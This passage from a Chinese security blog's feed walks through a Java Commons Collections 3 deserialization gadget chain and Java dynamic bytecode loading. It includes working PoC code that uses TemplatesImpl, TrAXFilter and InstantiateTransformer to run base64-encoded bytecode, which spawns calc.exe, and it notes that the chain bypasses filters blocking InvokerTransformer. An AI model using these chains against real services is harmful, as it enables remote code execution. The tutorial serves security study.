ConstantTransformer(obj),<span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;newTransformer&quot;</span>,<span class="keyword">null</span>,<span class="keyword">null</span>)&#125;;</span><br><span class="line">        Transformer transformersChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        <span class="comment">//Map outerMap = TransformedMap.decorate(innerMap,null,transformersChain);</span></span><br><span class="line">        <span class="comment">//outerMap.put(&quot;name&quot;,&quot;Arsene.Tang&quot;);</span></span><br><span class="line">        Map outerMap = LazyMap.decorate(innerMap,transformersChain);</span><br><span class="line">        outerMap.get(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/03/01/cUGWEVOL9k4zp6Z.png" alt="image.png"></p><p>这里是用的手动触发，当然我们还可以改成反序列化触发，甚至于写成更加通用的cc6的链子，这里面的内容好像我前面的文章都讲了，这儿我就不浪费时间了，直接切进主题，看看cc3</p><h2 id="为什么要出现cc3"><a href="#为什么要出现cc3" class="headerlink" title="为什么要出现cc3"></a>为什么要出现cc3</h2><p>其实在前面我们已经已经有一条cc6的通用链子了，那我们为什么还需要cc3呢，因为我们得绕过一些过滤，因为现在很多的反序列化过滤器都过滤掉了<code>InvokerTransformer</code>，这样我们原始的cc1的链子就打不通了，所以说我们得换个类来代替它</p><h2 id="InstantiateTransformer"><a href="#InstantiateTransformer" class="headerlink" title="InstantiateTransformer"></a>InstantiateTransformer</h2><p>而这个类就是<code>org.apache.commons.collections.functors.InstantiateTransformer</code>，<code>InstantiateTransformer</code>类也是实现了<code>Transformer</code>接口的一个类，而它的作用是调用构造方法，先看看它的代码吧：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">InstantiateTransformer</span> <span class="keyword">implements</span> <span class="title">Transformer</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (!(input <span class="keyword">instanceof</span> Class)) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">&quot;InstantiateTransformer: Input object was not an instanceof Class, it was a &quot;</span> + (input == <span class="keyword">null</span> ? <span class="string">&quot;null object&quot;</span> : input.getClass().getName()));</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                Constructor con = ((Class)input).getConstructor(<span class="keyword">this</span>.iParamTypes);</span><br><span class="line">                <span class="keyword">return</span> con.newInstance(<span class="keyword">this</span>.iArgs);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException var6) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">&quot;InstantiateTransformer: The constructor must exist and be public &quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InstantiationException var7) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">&quot;InstantiateTransformer: InstantiationException&quot;</span>, var7);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException var8) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">&quot;InstantiateTransformer: Constructor must be public&quot;</span>, var8);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException var9) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">&quot;InstantiateTransformer: Constructor threw an exception&quot;</span>, var9);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可能大家会有疑问，只能调用构造方法有什么用呢，那假如我们能找到一个类，在它的构造方法中，正好就调用了<code>TransformerImpl</code>类中的<code>newTransformer()</code>方法，那不就完美了嘛</p><h2 id="TrAXFilter"><a href="#TrAXFilter" class="headerlink" title="TrAXFilter"></a>TrAXFilter</h2><p>而这个类，就是<code>com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter</code>，在这个类的构造方法中，就正好调用了<code>(TransformerImpl) templates.newTransformer()</code>，免去了我们使用<code>InvokerTransformer</code>手工调用<code>newTransformer</code>了，看看它的代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TrAXFilter</span> <span class="keyword">extends</span> <span class="title">XMLFilterImpl</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Templates              _templates;</span><br><span class="line">    <span class="keyword">private</span> TransformerImpl        _transformer;</span><br><span class="line">    <span class="keyword">private</span> TransformerHandlerImpl _transformerHandler;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">boolean</span> _overrideDefaultParser;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">TrAXFilter</span><span class="params">(Templates templates)</span> <span class="keyword">throws</span> TransformerConfigurationException</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        _templates = templates;</span><br><span class="line">        _transformer = (TransformerImpl) templates.newTransformer();<span class="comment">//调用</span></span><br><span class="line">        _transformerHandler = <span class="keyword">new</span> TransformerHandlerImpl(_transformer);</span><br><span class="line">        _overrideDefaultParser = _transformer.overrideDefaultParser();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那这不就好起来了，只要我们利用<code>InstantiateTransformer</code>来调用到<code>TrAXFilter</code>的构造方法，那么它就会自动调用<code>templates.newTransformer()</code>，就可以加载我们放在<code>TemplatesImpl</code>里面的字节码了</p><p>所以说调用链如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">    <span class="keyword">new</span> ConstantTransformer(TrAXFilter.class),</span><br><span class="line">    <span class="keyword">new</span> InstantiateTransformer(<span class="keyword">new</span> Class[] &#123; Templates.class &#125;, <span class="keyword">new</span> Object[] &#123; obj &#125;)</span><br><span class="line"> &#125;;</span><br></pre></td></tr></table></figure><p>把这个<code>Transformer</code>数组替换掉之前那个数组就可以了，所以说完整代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonsCollections3_1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">byte</span>[] code = Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQAIwoABwAUBwAVCAAWCgAXABgKABcAGQcAGgcAGwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAcAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgcAHQEAClNvdXJjZUZpbGUBAAlldmlsLmphdmEMAA8AEAEAEGphdmEvbGFuZy9TdHJpbmcBAAhjYWxjLmV4ZQcAHgwAHwAgDAAhACIBABN5c29zZXJpYWwvdGVzdC9ldmlsAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAoKFtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAYABwAAAAAAAwABAAgACQACAAoAAAAZAAAAAwAAAAGxAAAAAQALAAAABgABAAAACwAMAAAABAABAA0AAQAIAA4AAgAKAAAAGQAAAAQAAAABsQAAAAEACwAAAAYAAQAAAA0ADAAAAAQAAQANAAEADwAQAAIACgAAADsABAACAAAAFyq3AAEEvQACWQMSA1NMuAAEK7YABVexAAAAAQALAAAAEgAEAAAADwAEABAADgARABYAEgAMAAAABAABABEAAQASAAAAAgAT&quot;</span>);</span><br><span class="line">        TemplatesImpl obj = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="keyword">byte</span>[][] &#123;code&#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;Arsene.Tang&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(TrAXFilter.class),</span><br><span class="line">            <span class="keyword">new</span> InstantiateTransformer(<span class="keyword">new</span> Class[] &#123; Templates.class &#125;, <span class="keyword">new</span> Object[] &#123; obj &#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformersChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Map outerMap = TransformedMap.decorate(innerMap,<span class="keyword">null</span>,transformersChain);</span><br><span class="line">        outerMap.put(<span class="string">&quot;name&quot;</span>,<span class="string">&quot;Arsene.Tang&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/03/01/FQT2G8EAvap3tLb.png" alt="image.png"></p><p>成功弹出计算器，当然这也是手动触发哈，想要反序列化触发就看看前面的文章吧POC改改就好了哦</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Commons-Collections-3&quot;&gt;&lt;a href=&quot;#Commons-Collections-3&quot; class=&quot;headerlink&quot; title=&quot;Commons Collections 3&quot;&gt;&lt;/a&gt;Commons Collections 3&lt;/h1&gt;&lt;p&gt;前面我们讲到了利用&lt;code&gt;TemplatesImpl&lt;/code&gt;加载字节码，只不过那时我们是手动调用的&lt;code&gt;newTransformer&lt;/code&gt;来触发的，接下来我们就来看看如何利用cc链来触发，以及cc3中用到的新类&lt;/p&gt;</summary>
    
    
    
    
    <category term="Java" scheme="https://arsenetang.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Java篇之Java动态加载字节码</title>
    <link href="https://arsenetang.github.io/2022/02/28/Java%E7%AF%87%E4%B9%8B%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/"/>
    <id>https://arsenetang.github.io/2022/02/28/Java%E7%AF%87%E4%B9%8B%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/</id>
    <published>2022-02-27T16:00:00.000Z</published>
    <updated>2022-02-28T12:25:27.294Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Java动态加载字节码"><a href="#Java动态加载字节码" class="headerlink" title="Java动态加载字节码"></a>Java动态加载字节码</h1><p>接着学Java了，前段时间挖了挖洞，过段时间再来写写经历和体会吧，接下来我们来看看Java中动态加载字节码的方法，可以远程加载服务器上的字节码，或者本地的字节码就行</p><span id="more"></span><h2 id="Java字节码是啥"><a href="#Java字节码是啥" class="headerlink" title="Java字节码是啥"></a>Java字节码是啥</h2><p>简单点儿说，Java字节码就是<code>.class</code>后缀的文件，里面存放的是Java虚拟机执行使用的一类指令；因为Java也是一门编译型的语言，所以说我们在运行之前需要先编译一遍，编译过后就会形成<code>.class</code>文件，就可以运行在不同平台的JVM虚拟机中了；其实不只是Java语言，像什么<code>Scala</code>、<code>Kotlin</code>这样的语言编写的代码，只要能编译成<code>.class</code>文件，都可以在JVM虚拟机中运行了</p><p>所以说字节码就是所有能被<strong>恢复成一个类</strong>，并且<strong>能在JVM虚拟机中加载的字节序列</strong>，都在我们的探讨范围内，这里偷张p神的图：</p><p><img src="https://s2.loli.net/2022/02/27/pd4lmPN6IcTWf2a.png" alt="image.png"></p><h2 id="URLClassLoader加载远程class文件"><a href="#URLClassLoader加载远程class文件" class="headerlink" title="URLClassLoader加载远程class文件"></a>URLClassLoader加载远程class文件</h2><p><code>ClassLoader</code>是一个加载器，就是用来告诉JVM虚拟机如何去加载这个类，默认的就是根据类名来加载类，这个类名需要是完整路径，比如说<code>java.lang.Runtime</code>；而这里我们提到的<code>URLClassLoader</code>，是默认加载器<code>AppClassLoader</code>的父类，所以说这个的工作过程实际上就是在介绍默认的Java类加载器的工作流程</p><p>首先，java会根据基础路径去寻找<code>class</code>文件来加载，而这个基础路径有三种情况：</p><ul><li>URL未以斜杠 / 结尾，则认为是一个JAR文件，使用 JarLoader来寻找类，即为在Jar包中寻找.class文件</li><li>URL以斜杠 / 结尾，且协议名是 file，则使用 FileLoader 来寻找类，即为在本地文件系统中寻找.class文件</li><li>URL以斜杠 / 结尾，且协议名不是file ，则使用最基础的Loader来寻找类</li></ul><p>所以说咱可以以斜杠<code>/</code>结尾，但又不用file协议，而是使用http协议，这样就可以用<code>Loader</code>来寻找类了</p><p>那我们来试试http协议，看能不能从远程http服务器上加载<code>.class</code>文件，首先我们得先编译出一个class文件，源码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">eviltest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">eviltest</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很简单的一个命令执行的代码，只要它新建了<code>eviltest</code>对象，访问了构造方法，它就能弹出计算器，接下来就用<code>javac</code>编译一下，然后将<code>.class</code>文件随便找个目录放着，然后在那个目录用<code>python</code>快速创建一个http服务器：<code>python3 -m http.server</code></p><p><img src="https://s2.loli.net/2022/02/27/ny7LpITNVvglSaH.png" alt="image.png"></p><p>然后就来写远程加载这个字节码的代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLClassLoader;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UrlLoaderTest</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">( String[] args )</span> <span class="keyword">throws</span> Exception</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        URL[] urls = &#123;<span class="keyword">new</span> URL(<span class="string">&quot;http://localhost:8000/&quot;</span>)&#125;;</span><br><span class="line">        URLClassLoader loader = URLClassLoader.newInstance(urls);</span><br><span class="line">        Class c = loader.loadClass(<span class="string">&quot;eviltest&quot;</span>);</span><br><span class="line">        c.newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后那个<code>newInstance</code>相当于就是一个创建对象，那么自然就会调用默认的无参构造方法，运行它：</p><p><img src="https://s2.loli.net/2022/02/27/Hwm7XprNDEtV6As.png" alt="image.png"></p><p>很完美，弹出计算器，而且日志上也有体现</p><h2 id="ClassLoader-defineClass直接加载字节码"><a href="#ClassLoader-defineClass直接加载字节码" class="headerlink" title="ClassLoader#defineClass直接加载字节码"></a>ClassLoader#defineClass直接加载字节码</h2><p>上面我们看到了利用<code>URLClassLoader</code>加载远程字节码，其实也就是<code>Java</code>中默认加载字节码的方法；接下来我们来看看<code>Java</code>加载字节码的方法的调用，无论是远程<code>class</code>文件，或者说本地的<code>class</code>或者<code>jar</code>文件，都是这样调用的</p><p>首先是调用<code>ClassLoader</code>类中的<code>loadClass</code>方法，这个方法的作用是从已经加载的类缓存、父加载器等位置去寻找类，在没有找到类的情况下，就会交给<code>ClassLoader</code>类的<code>findClass</code>方法；然后<code>findClass</code>方法就是根据基础路径的方式，可能会在本地文件系统、jar包或远程http服务器上读取字节码，然后将字节码交给<code>ClassLoader</code>类的<code>defineClass</code>，<code>defineClass</code>的作用就是处理前面传入的字节码，将其处理为真正的Java类；<code>ClassLoader#loadClass  -&gt;  ClassLoader#findClass  -&gt;  ClassLoader#defineClass</code></p><p>所以说真正的核心就是<code>defineClass</code>，它决定了怎么将一段字节流变成Java类，这个逻辑挺复杂的，在JVM中的C语言代码中，这儿就不深究了，直接看看它是咋个加载的就行：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloDefineClass</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Method defineClass = ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>, String.class, <span class="keyword">byte</span>[].class, <span class="keyword">int</span>.class, <span class="keyword">int</span>.class);</span><br><span class="line">        defineClass.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        <span class="keyword">byte</span>[] code = Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQAHAoABgAPCgAQABEIABIKABAAEwcAFAcAFQEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAWAQAKU291cmNlRmlsZQEADWV2aWx0ZXN0LmphdmEMAAcACAcAFwwAGAAZAQAIY2FsYy5leGUMABoAGwEACGV2aWx0ZXN0AQAQamF2YS9sYW5nL09iamVjdAEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAGAAAAAAABAAEABwAIAAIACQAAAC4AAgABAAAADiq3AAG4AAISA7YABFexAAAAAQAKAAAADgADAAAAAgAEAAMADQAEAAsAAAAEAAEADAABAA0AAAACAA4=&quot;</span>);</span><br><span class="line">        Class hello = (Class)defineClass.invoke(ClassLoader.getSystemClassLoader(), <span class="string">&quot;eviltest&quot;</span>, code, <span class="number">0</span>, code.length);</span><br><span class="line">        hello.newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为<code>defineClass</code>这个方法是受保护的，所以说我们必须通过暴力反射来获取到它，然后这个字节码就是我们前面远程调用的那一段字节码经过了base64加密过后的，然后就是依然创建对象，在对象创建的时候调用无参构造方法，执行命令：</p><p><img src="https://s2.loli.net/2022/02/27/Kq5TesWxAGnuYCX.png" alt="image.png"></p><h2 id="利用TemplatesImpl加载字节码"><a href="#利用TemplatesImpl加载字节码" class="headerlink" title="利用TemplatesImpl加载字节码"></a>利用TemplatesImpl加载字节码</h2><p>前面我们介绍了<code>defineClass</code>，但因为<code>defineClass</code>方法作用域不开放，所以说很难直接利用它，而且大部分上层开发者也不会直接使用到，但是有一些Java底层的类用到了它，而它就是非常经典的<code>TemplatesImpl</code>，在反序列化中这个类是很重要的</p><p>在<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>这个类中定义了一个内部类<code>TransletClassLoader</code>，而在这个类中重写了<code>defineClass</code>方法，而且这个方法并没有显式地声明定义域，也就是说它是一种默认的类型，也就是<code>default</code>类型的，而默认类型的是可以被类外部调用的，这就挺好，有了更大的利用空间了，看看它的代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">TransletClassLoader</span> <span class="keyword">extends</span> <span class="title">ClassLoader</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map&lt;String,Class&gt; _loadedExternalExtensionFunctions;</span><br><span class="line">    TransletClassLoader(ClassLoader parent) &#123;</span><br><span class="line">        <span class="keyword">super</span>(parent);</span><br><span class="line">        _loadedExternalExtensionFunctions = <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br><span class="line">    TransletClassLoader(ClassLoader parent,Map&lt;String, Class&gt; mapEF) &#123;</span><br><span class="line">        <span class="keyword">super</span>(parent);</span><br><span class="line">        _loadedExternalExtensionFunctions = mapEF;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">public</span> Class&lt;?&gt; loadClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        Class&lt;?&gt; ret = <span class="keyword">null</span>;</span><br><span class="line">        <span class="comment">// The _loadedExternalExtensionFunctions will be empty when the SecurityManager is not set and the FSP is turned off</span></span><br><span class="line">        <span class="keyword">if</span> (_loadedExternalExtensionFunctions != <span class="keyword">null</span>) &#123;</span><br><span class="line">            ret = _loadedExternalExtensionFunctions.get(name);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (ret == <span class="keyword">null</span>) &#123;</span><br><span class="line">            ret = <span class="keyword">super</span>.loadClass(name);</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* Access to final protected superclass member from outer class.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">    <span class="function">Class <span class="title">defineClass</span><span class="params">(<span class="keyword">final</span> <span class="keyword">byte</span>[] b)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> defineClass(<span class="keyword">null</span>, b, <span class="number">0</span>, b.length);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为<code>TransletClassLoader</code>是内部类，所以说只允许<code>TemplatesImpl</code>类中的方法调用，那我们就往上看看，有没有方法调用了它，是有的，它就是<code>TemplatesImpl</code>类中的<code>defineTransletClasses()</code>方法，但它是一个<code>private</code>方法，代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">defineTransletClasses</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> TransformerConfigurationException </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (_bytecodes == <span class="keyword">null</span>) &#123;</span><br><span class="line">            ErrorMsg err = <span class="keyword">new</span> 